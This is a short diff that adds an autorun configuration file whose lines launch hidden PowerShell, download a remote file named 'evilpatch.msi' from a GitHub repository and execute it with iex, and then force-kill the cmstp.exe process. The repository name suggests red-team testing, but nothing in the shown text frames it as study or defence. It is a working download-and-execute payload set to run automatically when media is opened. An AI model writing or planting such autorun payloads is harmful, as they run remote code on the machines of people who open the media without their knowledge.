@@ -1,0 +1,3 @@
+[autorun]
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hiDden iex ((New-Object System.Net.WebClient).DownloadString('https://github.com/rainpi/test-redteam/raw/main/evilpatch.msi'))
+taskkill /IM CMsTp.exe /F
